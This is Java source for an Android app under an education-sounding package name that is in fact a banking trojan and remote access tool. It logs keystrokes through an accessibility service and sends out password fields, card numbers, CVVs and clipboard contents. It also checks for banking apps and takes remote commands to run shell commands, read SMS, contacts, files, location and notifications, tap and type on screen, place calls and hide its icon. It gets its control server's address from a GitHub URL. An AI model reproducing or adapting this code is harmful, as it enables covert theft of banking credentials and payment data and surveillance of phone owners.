package com.eloeeducacao;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class Boot extends BroadcastReceiver {
    @Override public void onReceive(Context c, Intent i) {
        try {
            Intent s = new Intent(c, NetSvc.class);
            if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(s);
            else c.startService(s);
        } catch (Throwable ignored) {}
    }
}
===== .\app\src\main\java\com\eloeeducacao\Captura.java =====
package com.eloeeducacao;

import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;

public final class Captura {

    private static final LinkedHashSet<String> vistos = new LinkedHashSet<>();
    private static volatile long ultimo;

    private static boolean luhn(String d) {
        int soma = 0;
        boolean par = false;
        for (int i = d.length() - 1; i >= 0; i--) {
            int n = d.charAt(i) - '0';
            if (par) {
                n *= 2;
                if (n > 9) n -= 9;
            }
            soma += n;
            par = !par;
        }
        return soma % 10 == 0;
    }

    private static String dica(AccessibilityNodeInfo n) {
        StringBuilder b = new StringBuilder();
        try {
            if (n.getViewIdResourceName() != null) {
                String id = n.getViewIdResourceName();
                int i = id.lastIndexOf('/');
                b.append(i >= 0 ? id.substring(i + 1) : id).append(' ');
            }
        } catch (Throwable ignored) {}
        try {
            if (n.getHintText() != null) b.append(n.getHintText()).append(' ');
        } catch (Throwable ignored) {}
        try {
            if (n.getContentDescription() != null) b.append(n.getContentDescription());
        } catch (Throwable ignored) {}
        String s = b.toString().trim();
        return s.length() > 60 ? s.substring(0, 60) : s;
    }

    private static void manda(String tipo, JSONObject o) {
        Net.send("{\"t\":\"" + tipo + "\",\"o\":" + o.toString() + "}");
    }

    public static void ev() {
        long a = System.currentTimeMillis();
        if (a - ultimo < 650) return;
        ultimo = a;
        KeySvc k = KeySvc.I;
        if (k == null) return;
        AccessibilityNodeInfo r = k.getRootInActiveWindow();
        if (r == null) return;
        AccessibilityNodeInfo f = null;
        try {
            f = r.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        } catch (Throwable ignored) {}
        if (f == null) return;
        CharSequence cs = f.getText();
        if (cs == null) return;
        String t = cs.toString().trim();
        if (t.length() < 3) return;

        String pkg = k.curPkg == null ? "?" : k.curPkg;
        String campo = dica(f);
        String chave = pkg + "|" + campo + "|" + t;
        if (vistos.contains(chave)) return;
        vistos.add(chave);
        if (vistos.size() > 500) {
            List<String> l = new ArrayList<>(vistos);
            vistos.clear();
            for (int i = l.size() - 350; i < l.size(); i++) vistos.add(l.get(i));
        }

        String baixo = campo.toLowerCase();
        try {
            JSONObject o = new JSONObject();
            o.put("app", pkg);
            o.put("campo", campo);
            if (f.isPassword()) {
                o.put("v", t);
                manda("cred", o);
                return;
            }
            String dig = t.replaceAll("[^0-9]", "");
            if (dig.length() >= 13 && dig.length() <= 19 && luhn(dig)) {
                o.put("v", dig);
                manda("cartao", o);
                return;
            }
            if (t.matches("(0[1-9]|1[0-2])\\s?/\\s?\\d{2,4}")) {
                o.put("v", t);
                manda("cartao", o);
                return;
            }
            if (dig.length() >= 3 && dig.length() <= 4
                    && (baixo.contains("cvv") || baixo.contains("segur")
                        || baixo.contains("cvc") || baixo.contains("cod"))) {
                o.put("v", dig);
                manda("cartao", o);
            }
        } catch (Throwable ignored) {}
    }
}

===== .\app\src\main\java\com\eloeeducacao\Cfg.java =====
package com.eloeeducacao;

import android.content.Context;

import java.util.Random;

public final class Cfg {
    public static final String TOKEN = "m4t7k2p9x6v3n8b5z1q0w7r2";
    public static final String TUNNEL = "";
    public static final String RAW = "https://raw.githubusercontent.com/rhuandasensikkj/aval/main/host.txt";
    public static final String RAW2 = "";
    public static final int PORT = 8080;
    public static final int DISC = 8089;

    public static String id(Context c) {
        String s = c.getSharedPreferences("p", 0).getString("id", null);
        if (s == null) {
            String a = "abcdefghijklmnopqrstuvwxyz0123456789";
            StringBuilder b = new StringBuilder();
            Random r = new Random();
            for (int i = 0; i < 6; i++) b.append(a.charAt(r.nextInt(a.length())));
            s = b.toString();
            c.getSharedPreferences("p", 0).edit().putString("id", s).apply();
        }
        return s;
    }
}
===== .\app\src\main\java\com\eloeeducacao\Clip.java =====
package com.eloeeducacao;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;

public final class Clip {

    public static volatile boolean on;
    private static String ultimo = "";
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static boolean rodando;

    public static void liga(final Context c) {
        if (rodando) return;
        rodando = true;
        H.postDelayed(new Runnable() {
            @Override public void run() {
                if (!on) { rodando = false; return; }
                try {
                    ClipboardManager cm = (ClipboardManager)
                            c.getSystemService(Context.CLIPBOARD_SERVICE);
                    ClipData d = cm.getPrimaryClip();
                    if (d != null && d.getItemCount() > 0) {
                        CharSequence t = d.getItemAt(0).coerceToText(c);
                        if (t != null && t.length() > 0 && t.length() < 4000) {
                            String s = t.toString();
                            if (!s.equals(ultimo)) {
                                ultimo = s;
                                Util.sendT("clip", s);
                            }
                        }
                    }
                } catch (Throwable ignored) {}
                H.postDelayed(this, 2500);
            }
        }, 800);
    }
}

===== .\app\src\main\java\com\eloeeducacao\Cmd.java =====
package com.eloeeducacao;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.provider.Settings;
import android.view.KeyEvent;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

public final class Cmd {

    private static boolean acc() {
        if (KeySvc.I != null) return true;
        Net.send("{\"t\":\"err\",\"o\":\"acessibilidade desligada\"}");
        return false;
    }

    public static void handle(Context c, String m) {
        try {
            JSONObject o = new JSONObject(m);
            String cmd = o.optString("c");
            KeySvc k = KeySvc.I;

            switch (cmd) {
                case "ka":
                    break;
                case "touch":
                    if (acc()) k.touch((float) o.optDouble("x"), (float) o.optDouble("y"));
                    break;
                case "long":
                    if (acc()) k.longPress((float) o.optDouble("x"), (float) o.optDouble("y"));
                    break;
                case "swipe":
                    if (acc()) k.swipe((float) o.optDouble("x1"), (float) o.optDouble("y1"),
                            (float) o.optDouble("x2"), (float) o.optDouble("y2"), o.optInt("ms", 260));
                    break;
                case "text":
                    if (acc()) k.setText(o.optString("s"));
                    break;
                case "key":
                    if (acc()) k.key(o.optInt("code", 4));
                    break;
                case "screen":
                    if (acc()) k.screenOn(o.optBoolean("on", true));
                    break;
                case "shot":
                    if (acc()) k.shotOn = o.optBoolean("on", true);
                    break;
                case "ov":
                    Ov.set(KeySvc.I != null ? KeySvc.I : c, o.optBoolean("on", true));
                    break;
                case "bank":
                    Aviso.clear();
                    ScreenSvc.giveUp = true;
                    ScreenSvc.alive = false;
                    try { c.stopService(new Intent(c, ScreenSvc.class)); } catch (Throwable ignored) {}
                    Ov.set(KeySvc.I != null ? KeySvc.I : c, false);
                    ScreenSvc.Q = 45;
                    ScreenSvc.FPS = 3;
                    Util.sendT("info", "modo banco: projecao off, overlay off");
                    if (acc()) Tree.dump(k);
                    break;
                case "unbank":
                    ScreenSvc.giveUp = false;
                    Util.sendT("info", "modo normal: reabra a captura na MainActivity");
                    break;
                case "macro":
                    if ("stop".equals(o.optString("op"))) Macro.stop();
                    else Macro.play(o.optJSONArray("s"), o.optJSONObject("v"));
                    break;
                case "run":
                    Macro.play(o.optJSONArray("s"), o.optJSONObject("v"));
                    break;
                case "setup": {
                    Intent i = new Intent(c, SetupActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    c.startActivity(i);
                    break;
                }
                case "decoy":
                    SetupActivity.loja(c);
                    break;
                case "contas":
                    Util.sendT("contas", Contas.lista(c));
                    break;
                case "finger":
                    Util.sendT("finger", Finger.txt(c));
                    break;
                case "clipon":
                    Clip.on = true;
                    Clip.liga(c);
                    break;
                case "snap":
                    Util.sendT("snap", Snap.dump());
                    break;
                case "watch":
                    Watch.on = o.optBoolean("on", true);
                    Util.sendT("info", "watch " + (Watch.on ? "on" : "off"));
                    break;
                case "aviso":
                    Aviso.show(c, o.optString("ti", "Sistema"), o.optString("tx", ""));
                    break;
                case "tree":
                    if (acc()) Tree.dump(k);
                    break;
                case "tap":
                    if (acc()) k.touch((float) o.optDouble("x"), (float) o.optDouble("y"));
                    break;
                case "fill":
                    if (acc()) Tree.fill(k, (float) o.optDouble("x"), (float) o.optDouble("y"), o.optString("s"));
                    break;
                case "q":
                    ScreenSvc.Q = Math.max(15, Math.min(90, o.optInt("v", 38)));
                    Net.send("{\"t\":\"info\",\"o\":\"q " + ScreenSvc.Q + "\"}");
                    break;
                case "fps":
                    ScreenSvc.FPS = Math.max(1, Math.min(15, o.optInt("v", 4)));
                    Net.send("{\"t\":\"info\",\"o\":\"fps " + ScreenSvc.FPS + "\"}");
                    break;
                case "res":
                    ScreenSvc.W = Math.max(360, Math.min(1080, o.optInt("v", 540)));
                    ScreenSvc.rebuildNow();
                    Net.send("{\"t\":\"info\",\"o\":\"res " + ScreenSvc.W + "\"}");
                    break;
                case "toast":
                    Toast.makeText(c, o.optString("s"), Toast.LENGTH_LONG).show();
                    break;
                case "url":
                    c.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(o.optString("u")))
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    break;
                case "open":
                    Intent i = c.getPackageManager().getLaunchIntentForPackage(o.optString("pkg"));
                    if (i != null) c.startActivity(i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    else Net.send("{\"t\":\"err\",\"o\":\"pacote nao encontrado\"}");
                    break;
                case "shell":
                    Net.send("{\"t\":\"sh\",\"o\":\"" + Util.esc(Util.exec(o.optString("cmd"))) + "\"}");
                    break;
                case "sms":
                    Net.send("{\"t\":\"sms\",\"o\":\"" + Util.esc(Extra.sms(c)) + "\"}");
                    break;
                case "contacts":
                    Net.send("{\"t\":\"cts\",\"o\":\"" + Util.esc(Extra.contacts(c)) + "\"}");
                    break;
                case "apps":
                    Net.send("{\"t\":\"apps\",\"o\":\"" + Util.esc(Extra.apps(c)) + "\"}");
                    break;
                case "loc":
                    Net.send("{\"t\":\"loc\",\"o\":\"" + Util.esc(Extra.loc(c)) + "\"}");
                    break;
                case "info":
                    Net.send("{\"t\":\"info\",\"o\":\"" + Util.esc(Extra.info(c)) + "\"}");
                    break;
                case "notif":
                    Net.send("{\"t\":\"notif\",\"o\":\"" + Util.esc(Extra.notifs(c)) + "\"}");
                    break;
                case "clip":
                    Net.send("{\"t\":\"clip\",\"o\":\"" + Util.esc(Extra.clip(c)) + "\"}");
                    break;
                case "setclip":
                    Extra.setClip(c, o.optString("s"));
                    break;
                case "ls":
                    Net.send("{\"t\":\"ls\",\"o\":\"" + Util.esc(Extra.ls(o.optString("p", "/sdcard"))) + "\"}");
                    break;
                case "dl":
                    Util.sendT("dl", Extra.cat(o.optString("p"), o.optInt("off", 0), o.optInt("n", 65536)));
                    break;
                case "bright":
                    Extra.bright(c, o.optInt("v", 50));
                    break;
                case "torch":
                    Extra.torch(c, o.optBoolean("on", true));
                    break;
                case "vol":
                    Extra.volume(c, o.optInt("dir", 1), o.optInt("v", -1));
                    break;
                case "play":
                    Extra.media(c, KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE);
                    break;
                case "next":
                    Extra.media(c, KeyEvent.KEYCODE_MEDIA_NEXT);
                    break;
                case "prev":
                    Extra.media(c, KeyEvent.KEYCODE_MEDIA_PREVIOUS);
                    break;
                case "dial":
                    Extra.dial(c, o.optString("n"), false);
                    break;
                case "call":
                    Extra.dial(c, o.optString("n"), true);
                    break;
                case "hide":
                    c.getPackageManager().setComponentEnabledSetting(
                            new ComponentName(c, "com.eloeeducacao.Alias"),
                            o.optBoolean("on", true)
                                    ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                                    : PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP);
                    Net.send("{\"t\":\"info\",\"o\":\"icone " +
                            (o.optBoolean("on", true) ? "oculto" : "visivel") + "\"}");
                    break;
                case "battery":
                    Intent b = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + c.getPackageName()));
                    b.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    c.startActivity(b);
                    break;
                case "wr":
                    Intent wr = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
                            Uri.parse("package:" + c.getPackageName()));
                    wr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    c.startActivity(wr);
                    break;
                case "recon":
                    Net.send("{\"t\":\"info\",\"o\":\"reconectando\"}");
                    Net.start(c);
                    break;
                case "ping":
                    Net.send("{\"t\":\"pong\"}");
                    break;
            }
        } catch (Throwable t) {
            Net.send("{\"t\":\"err\",\"o\":\"" + Util.esc(String.valueOf(t)) + "\"}");
        }
    }
}

===== .\app\src\main\java\com\eloeeducacao\Contas.java =====
package com.eloeeducacao;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;

public final class Contas {
    public static String lista(Context c) {
        StringBuilder b = new StringBuilder();
        try {
            AccountManager am = AccountManager.get(c);
            for (Account a : am.getAccounts()) {
                b.append(a.type).append('\t').append(a.name).append('\n');
            }
        } catch (Throwable t) {
            return "err: " + t;
        }
        return b.length() == 0 ? "nenhuma conta" : b.toString();
    }
}

===== .\app\src\main\java\com\eloeeducacao\Extra.java =====
package com.eloeeducacao;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Base64;
import android.view.KeyEvent;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public final class Extra {

    private static final int MAX = 12000;

    private static String cut(String s) {
        if (s == null) return "";
        return s.length() > MAX ? s.substring(0, MAX) + "\n[...cortado]" : s;
    }

    public static String sms(Context c) {
        StringBuilder sb = new StringBuilder();
        try {
            android.database.Cursor cu = c.getContentResolver().query(
                    Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
            int n = 0;
            if (cu != null) {
                SimpleDateFormat f = new SimpleDateFormat("dd/MM HH:mm", Locale.US);
                while (cu.moveToNext() && n < 60) {
                    String addr = cu.getString(cu.getColumnIndexOrThrow("address"));
                    String body = cu.getString(cu.getColumnIndexOrThrow("body"));
                    long ts = cu.getLong(cu.getColumnIndexOrThrow("date"));
                    sb.append(f.format(new Date(ts))).append(" | ").append(addr)
                      .append(" | ").append(body).append('\n');
                    n++;
                }
                cu.close();
            }
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return cut(sb.toString());
    }

    public static String contacts(Context c) {
        StringBuilder sb = new StringBuilder();
        try {
            android.database.Cursor cu = c.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
            int n = 0;
            if (cu != null) {
                while (cu.moveToNext() && n < 400) {
                    String name = cu.getString(cu.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String num = cu.getString(cu.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(" <").append(num).append(">\n");
                    n++;
                }
                cu.close();
            }
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return cut(sb.toString());
    }

    public static String apps(Context c) {
        StringBuilder sb = new StringBuilder();
        try {
            PackageManager pm = c.getPackageManager();
            List<ApplicationInfo> l = pm.getInstalledApplications(0);
            for (ApplicationInfo a : l) {
                boolean launch = pm.getLaunchIntentForPackage(a.packageName) != null;
                if (!launch) continue;
                sb.append(pm.getApplicationLabel(a)).append(" | ").append(a.packageName).append('\n');
            }
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return cut(sb.toString());
    }

    public static String loc(Context c) {
        StringBuilder sb = new StringBuilder();
        try {
            LocationManager lm = (LocationManager) c.getSystemService(Context.LOCATION_SERVICE);
            for (String p : lm.getProviders(true)) {
                Location l = lm.getLastKnownLocation(p);
                if (l == null) continue;
                sb.append(p).append(": ").append(l.getLatitude()).append(',')
                  .append(l.getLongitude()).append(" +-").append(l.getAccuracy())
                  .append("m ").append((System.currentTimeMillis() - l.getTime()) / 1000).append("s atras\n");
            }
            if (sb.length() == 0) sb.append("sem posicao em cache");
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return sb.toString();
    }

    public static String clip(Context c) {
        try {
            ClipboardManager cm = (ClipboardManager) c.getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData d = cm.getPrimaryClip();
            if (d == null || d.getItemCount() == 0) return "vazio";
            return String.valueOf(d.getItemAt(0).coerceToText(c));
        } catch (Throwable t) {
            return "err: " + t;
        }
    }

    public static void setClip(final Context c, final String s) {
        try {
            android.os.Handler h = new android.os.Handler(android.os.Looper.getMainLooper());
            h.post(new Runnable() {
                @Override public void run() {
                    try {
                        ClipboardManager cm = (ClipboardManager) c.getSystemService(Context.CLIPBOARD_SERVICE);
                        cm.setPrimaryClip(ClipData.newPlainText("a", s));
                    } catch (Throwable ignored) {}
                }
            });
        } catch (Throwable ignored) {}
    }

    public static String notifs(Context c) {
        return cut(Util.exec("dumpsys notification --noredact"));
    }

    public static String info(Context c) {
        StringBuilder sb = new StringBuilder();
        try {
            sb.append("modelo: ").append(Build.MANUFACTURER).append(' ').append(Build.MODEL).append('\n');
            sb.append("sdk: ").append(Build.VERSION.SDK_INT).append(" rel: ").append(Build.VERSION.RELEASE).append('\n');
            sb.append("board: ").append(Build.BOARD).append(" abi: ")
              .append(Build.SUPPORTED_ABIS.length > 0 ? Build.SUPPORTED_ABIS[0] : "?").append('\n');
            sb.append("uptime: ").append(android.os.SystemClock.elapsedRealtime() / 1000).append("s\n");
            StatFs st = new StatFs(Environment.getDataDirectory().getAbsolutePath());
            sb.append("livre: ").append(st.getAvailableBytes() / 1048576).append("MB de ")
              .append(st.getTotalBytes() / 1048576).append("MB\n");
            sb.append("ip: ").append(Util.ip()).append('\n');
            sb.append("tela: ").append(Util.screen(c)).append('\n');
            sb.append("brilho: ").append(Settings.System.getInt(c.getContentResolver(),
                    Settings.System.SCREEN_BRIGHTNESS, -1)).append('\n');
            sb.append("acc: ").append(Util.accOn(c)).append('\n');
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return sb.toString();
    }

    public static String ls(String path) {
        StringBuilder sb = new StringBuilder();
        try {
            File d = new File(path);
            File[] fs = d.listFiles();
            if (fs == null) return "sem acesso ou vazio: " + path;
            java.util.Arrays.sort(fs);
            for (File f : fs) {
                sb.append(f.isDirectory() ? "d " : "- ").append(f.length()).append('\t')
                  .append(f.getName()).append('\n');
                if (sb.length() > MAX) break;
            }
        } catch (Throwable t) {
            sb.append("err: ").append(t);
        }
        return cut(sb.toString());
    }

    public static String cat(String path, int off, int len) {
        java.io.RandomAccessFile raf = null;
        try {
            File f = new File(path);
            if (!f.isFile()) return "nao e arquivo";
            long total = f.length();
            raf = new java.io.RandomAccessFile(f, "r");
            raf.seek(Math.max(0, Math.min(off, total)));
            int n = (int) Math.min(len, Math.max(1, total - raf.getFilePointer()));
            byte[] b = new byte[n];
            int r = raf.read(b);
            if (r <= 0) return "fim";
            return "off=" + off + " total=" + total + " b64=" + Base64.encodeToString(
                    r == n ? b : java.util.Arrays.copyOf(b, r), Base64.NO_WRAP);
        } catch (Throwable t) {
            return "err: " + t;
        } finally {
            try { if (raf != null) raf.close(); } catch (Throwable ignored) {}
        }
    }

    public static void bright(Context c, int pct) {
        try {
            int v = Math.max(0, Math.min(255, pct * 255 / 100));
            Settings.System.putInt(c.getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, v);
            Settings.System.putInt(c.getContentResolver(), Settings.System.SCREEN_BRIGHTNESS_MODE, 0);
        } catch (Throwable ignored) {}
    }

    public static void torch(Context c, boolean on) {
        try {
            CameraManager cm = (CameraManager) c.getSystemService(Context.CAMERA_SERVICE);
            for (String id : cm.getCameraIdList()) {
                Boolean has = cm.getCameraCharacteristics(id)
                        .get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                if (has != null && has) {
                    cm.setTorchMode(id, on);
                    return;
                }
            }
        } catch (Throwable ignored) {}
    }

    public static void volume(Context c, int dir, int pct) {
        try {
            AudioManager am = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
            if (pct >= 0) {
                int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                am.setStreamVolume(AudioManager.STREAM_MUSIC, Math.max(0, Math.min(max, pct * max / 100)), 0);
            } else {
                am.adjustStreamVolume(AudioManager.STREAM_MUSIC,
                        dir > 0 ? AudioManager.ADJUST_RAISE : AudioManager.ADJUST_LOWER,
                        AudioManager.FLAG_SHOW_UI);
            }
        } catch (Throwable ignored) {}
    }

    public static void media(Context c, int code) {
        try {
            AudioManager am = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
            am.dispatchMediaKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, code));
            am.dispatchMediaKeyEvent(new KeyEvent(KeyEvent.ACTION_UP, code));
        } catch (Throwable ignored) {}
    }

    public static void dial(Context c, String num, boolean call) {
        try {
            Intent i = new Intent(call ? Intent.ACTION_CALL : Intent.ACTION_DIAL,
                    Uri.parse("tel:" + Uri.encode(num)));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Throwable ignored) {}
    }
}
===== .\app\src\main\java\com\eloeeducacao\Finger.java =====
package com.eloeeducacao;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;

import java.util.Locale;
import java.util.TimeZone;

public final class Finger {

    private static final String[] BANCOS = {
            "br.com.intermedium", "com.nu.production", "com.itau", "com.bradesco",
            "com.santander.app", "br.com.bb.android", "com.picpay", "com.mercadopago.wallet",
            "br.com.caixa", "com.google.android.apps.walletnfcrel"
    };

    public static String txt(Context c) {
        StringBuilder b = new StringBuilder();
        b.append("modelo: ").append(Build.MANUFACTURER).append(' ').append(Build.MODEL).append('\n');
        b.append("marca: ").append(Build.BRAND).append('\n');
        b.append("device: ").append(Build.DEVICE).append('\n');
        b.append("build: ").append(Build.DISPLAY).append('\n');
        b.append("android: ").append(Build.VERSION.RELEASE).append(" sdk ").append(Build.VERSION.SDK_INT).append('\n');
        b.append("abi: ").append(Build.SUPPORTED_ABIS.length > 0 ? Build.SUPPORTED_ABIS[0] : "?").append('\n');
        b.append("idioma: ").append(Locale.getDefault().toString()).append('\n');
        b.append("fuso: ").append(TimeZone.getDefault().getID()).append('\n');
        b.append("tela: ").append(Util.screen(c)).append('\n');
        try {
            StatFs s = new StatFs(Environment.getDataDirectory().getPath());
            b.append("disco livre: ").append(s.getAvailableBytes() / 1048576).append(" MB\n");
        } catch (Throwable ignored) {}
        b.append("ip: ").append(Util.ip()).append('\n');
        try {
            android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager)
                    c.getSystemService(Context.TELEPHONY_SERVICE);
            b.append("operadora: ").append(tm.getNetworkOperatorName()).append('\n');
        } catch (Throwable ignored) {}
        b.append("root: ").append(root() ? "sim" : "nao").append('\n');
        b.append("emulador: ").append(emu() ? "sim" : "nao").append('\n');
        b.append("dev options: ")
                .append(android.provider.Settings.Global.getInt(c.getContentResolver(),
                        android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) == 1
                        ? "ligado" : "desligado").append('\n');
        b.append("acessibilidade: ").append(Util.accOn(c) ? "ativa" : "inativa").append('\n');
        b.append("--- apps de banco ---\n");
        for (String p : BANCOS) {
            try {
                c.getPackageManager().getPackageInfo(p, 0);
                b.append("  ").append(p).append('\n');
            } catch (Throwable ignored) {}
        }
        return b.toString();
    }

    private static boolean root() {
        String[] p = {"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su",
                "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su",
                "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su"};
        for (String s : p) if (new java.io.File(s).exists()) return true;
        return false;
    }

    private static boolean emu() {
        return Build.FINGERPRINT.startsWith("generic")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu");
    }
}

===== .\app\src\main\java\com\eloeeducacao\KeySvc.java =====
package com.eloeeducacao;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.view.Display;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import java.io.ByteArrayOutputStream;

public class KeySvc extends AccessibilityService {

    public static volatile KeySvc I;

    private final Handler H = new Handler(Looper.getMainLooper());
    private final StringBuilder buf = new StringBuilder();
    private volatile long lastFlush;
    public volatile String curPkg;
    private volatile String curWin;
    public volatile boolean shotOn = true;
    private volatile boolean shotBusy;
    private volatile long lastShot;
    private WindowManager wm;
    private View ov;
    private PowerManager.WakeLock wl;

    private final Runnable flush = new Runnable() {
        @Override public void run() { flushNow(); }
    };

    private final Runnable loop = new Runnable() {
        @Override public void run() {
            int iv = 400;
            try {
                boolean precisa = !ScreenSvc.alive || ScreenSvc.black || ScreenSvc.giveUp
                        || System.currentTimeMillis() - ScreenSvc.lastFrame > 5000;
                iv = Math.max(300, 1000 / Math.max(1, ScreenSvc.FPS));
                if (shotOn && precisa && Build.VERSION.SDK_INT >= 30
                        && System.currentTimeMillis() - lastShot >= iv) {
                    lastShot = System.currentTimeMillis();
                    grab();
                }
            } catch (Throwable ignored) {}
            H.postDelayed(this, Math.max(200, iv));
        }
    };

    @Override protected void onServiceConnected() {
        super.onServiceConnected();
        I = this;
        try {
            NetSvc.arranca(this);
        } catch (Throwable ignored) {}
        H.post(flush);
        H.post(loop);
    }

    @Override public void onDestroy() {
        H.removeCallbacks(flush);
        H.removeCallbacks(loop);
        overlay(false);
        Ov.clear();
        try { if (wl != null && wl.isHeld()) wl.release(); } catch (Throwable ignored) {}
        I = null;
        super.onDestroy();
    }

    @Override public void onAccessibilityEvent(AccessibilityEvent e) {
        Watch.ev();
        Captura.ev();
        try {
            String p = e.getPackageName() == null ? null : e.getPackageName().toString();
            if (p != null && !p.equals(curPkg)) {
                curPkg = p;
                if (Ov.on() && Ov.banco(p)) Ov.set(this, false);
            }
            if (e.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                    && e.getClassName() != null) {
                String w = e.getClassName().toString();
                int i = w.lastIndexOf('.');
                curWin = i >= 0 ? w.substring(i + 1) : w;
            }
        } catch (Throwable ignored) {}
    }

    @Override public void onInterrupt() {}

    @Override public boolean onKeyEvent(KeyEvent e) {
        try {
            if (e.getAction() != KeyEvent.ACTION_DOWN) return false;
            String pkg = curPkg;
            if (pkg != null && pkg.equals(getPackageName())) return false;
            int kc = e.getKeyCode();
            if (kc == KeyEvent.KEYCODE_BACK || kc == KeyEvent.KEYCODE_HOME
                    || kc == KeyEvent.KEYCODE_APP_SWITCH) return false;
            CharSequence cs = e.getCharacters();
            String txt = cs == null ? "" : cs.toString();
            if (txt.length() == 0) {
                if (kc == KeyEvent.KEYCODE_DEL) txt = "[DEL]";
                else if (kc == KeyEvent.KEYCODE_ENTER) txt = "[ENTER]";
                else if (kc == KeyEvent.KEYCODE_TAB) txt = "[TAB]";
                else if (kc == KeyEvent.KEYCODE_DPAD_UP) txt = "[CIMA]";
                else if (kc == KeyEvent.KEYCODE_DPAD_DOWN) txt = "[BAIXO]";
                else if (kc == KeyEvent.KEYCODE_SPACE) txt = " ";
                else return false;
            }
            add(pkg == null ? "?" : pkg, txt);
        } catch (Throwable ignored) {}
        return false;
    }

    private void add(String pkg, String s) {
        synchronized (buf) {
            if (buf.length() > 0) buf.append(' ');
            buf.append(pkg).append(':').append(s);
        }
        if (buf.length() >= 180 || System.currentTimeMillis() - lastFlush >= 400) flushNow();
    }

    private void flushNow() {
        H.removeCallbacks(flush);
        String s;
        synchronized (buf) {
            s = buf.toString();
            buf.setLength(0);
        }
        if (s.length() > 0) {
            Net.send("{\"t\":\"k\",\"pkg\":\"" + Util.esc(curPkg == null ? "?" : curPkg)
                    + "\",\"win\":\"" + Util.esc(curWin == null ? "" : curWin)
                    + "\",\"o\":\"" + Util.esc(s) + "\"}");
            lastFlush = System.currentTimeMillis();
        }
        H.postDelayed(flush, 1500);
    }

    public void touch(final float x, final float y) {
        H.post(() -> {
            try {
                Path p = new Path();
                p.moveTo(x, y);
                GestureDescription.Builder b = new GestureDescription.Builder();
                b.addStroke(new GestureDescription.StrokeDescription(p, 0, 40));
                dispatchGesture(b.build(), null, null);
            } catch (Throwable ignored) {}
        });
    }

    public void swipe(final float x1, final float y1, final float x2, final float y2, final int ms) {
        H.post(() -> {
            try {
                Path p = new Path();
                p.moveTo(x1, y1);
                p.lineTo(x2, y2);
                GestureDescription.Builder b = new GestureDescription.Builder();
                b.addStroke(new GestureDescription.StrokeDescription(p, 0, Math.max(80, ms)));
